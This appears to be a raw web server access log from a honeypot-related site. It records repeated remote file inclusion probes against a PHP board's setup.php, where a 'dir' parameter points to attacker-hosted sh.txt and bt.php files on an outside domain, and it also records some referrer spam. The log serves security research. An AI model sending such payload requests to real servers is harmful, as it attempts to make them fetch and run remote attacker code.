112.218.68.155 - - [30/Mar/2015:20:18:05 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:09 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:10 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:11 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:13 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:13 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
112.218.68.155 - - [30/Mar/2015:20:18:15 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0" 
104.130.161.114 - - [30/Mar/2015:20:21:31 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:21:31 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:21:45 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:21:45 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
198.144.188.26 - - [30/Mar/2015:20:23:49 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:50 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:50 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:51 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:51 -0700] "GET ////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:53 -0700] "GET ////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:53 -0700] "POST ////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:53 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:54 -0700] "POST ////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:54 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:55 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:55 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:55 -0700] "GET /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:56 -0700] "POST /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:56 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:56 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:57 -0700] "POST /honeypot////bbs/skin/ggambo7002_boardgallery/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:57 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:57 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:59 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:23:59 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:24:00 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:24:00 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
198.144.188.26 - - [30/Mar/2015:20:24:01 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0" 
112.218.68.155 - - [30/Mar/2015:20:24:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:20 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:21 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:22 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:23 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:25 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:25 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:26 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:27 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:28 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:29 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
112.218.68.155 - - [30/Mar/2015:20:24:30 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:32.0) Gecko/20100101 Firefox/32.0" 
181.65.186.35 - - [30/Mar/2015:20:25:18 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:19 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:20 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:21 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:22 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:23 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:24 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:25 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:25 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:27 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:27 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:25:29 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.41 Safari/537.36" 
46.119.118.191 - - [30/Mar/2015:20:26:07 -0700] "GET / HTTP/1.1" 200 22089 "http://wcw.su/" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
46.119.118.191 - - [30/Mar/2015:20:26:08 -0700] "GET / HTTP/1.1" 200 22089 "http://wcw.su/" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
46.119.118.191 - - [30/Mar/2015:20:26:08 -0700] "GET / HTTP/1.1" 200 22089 "http://wcw.su/" "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)" 
104.130.161.114 - - [30/Mar/2015:20:27:34 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:27:34 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:29:18 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 301 484 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:29:18 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb HTTP/1.1" 200 930780 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:29:22 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:29:22 -0700] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:29:23 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 492 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:29:23 -0700] "GET /bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
181.65.186.35 - - [30/Mar/2015:20:29:35 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:37 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:37 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:39 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:39 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:41 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:41 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:43 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:43 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:44 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:45 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
181.65.186.35 - - [30/Mar/2015:20:29:46 -0700] "POST /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.131 Safari/537.36" 
104.130.161.114 - - [30/Mar/2015:20:30:24 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:30:24 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:30:36 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:30:36 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:30:37 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:30:37 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
5.9.233.36 - - [30/Mar/2015:20:33:24 -0700] "GET /honeypot/Honeypot%20-%20Howto%20-%20BSides%20Austin.pdf HTTP/1.1" 200 2928460 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/39.0.2171.50 Mobile/12B440 Safari/600.1.4" 
212.45.53.80 - - [30/Mar/2015:20:35:19 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
212.45.53.80 - - [30/Mar/2015:20:35:20 -0700] "GET ////bbs/skin/ggambo7002_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
212.45.53.80 - - [30/Mar/2015:20:35:20 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
212.45.53.80 - - [30/Mar/2015:20:35:21 -0700] "POST ////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007" 
41.193.5.54 - - [30/Mar/2015:20:43:53 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//sh.txt? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
41.193.5.54 - - [30/Mar/2015:20:43:58 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php?dir=http://chemfield.co.kr/.mods//bt.php? HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
41.193.5.54 - - [30/Mar/2015:20:44:25 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
41.193.5.54 - - [30/Mar/2015:20:44:29 -0700] "POST /honeypot/Honeypot%20-%20Howto.pdf////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
104.130.161.114 - - [30/Mar/2015:20:47:02 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:47:02 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:47:03 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 553 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:47:03 -0700] "GET /honeypot/BSidesDFW%20-%202014.ipynb////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
41.193.5.54 - - [30/Mar/2015:20:47:24 -0700] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
41.193.5.54 - - [30/Mar/2015:20:47:25 -0700] "POST ////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
104.130.161.114 - - [30/Mar/2015:20:48:56 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.114 - - [30/Mar/2015:20:48:56 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:49:02 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 301 511 "-" "Tornado-Async-Client" 
104.130.161.115 - - [30/Mar/2015:20:49:02 -0700] "GET /honeypot////bbs/skin/ggambo7002_board/setup.php HTTP/1.1" 404 284 "-" "Tornado-Async-Client" 
41.193.5.54 - - [30/Mar/2015:20:49:16 -0700] "POST /honeypot////bbs/skin/ggambo6000_board/setup.php HTTP/1.1" 404 284 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; SMJB; rv:11.0) like Gecko" 
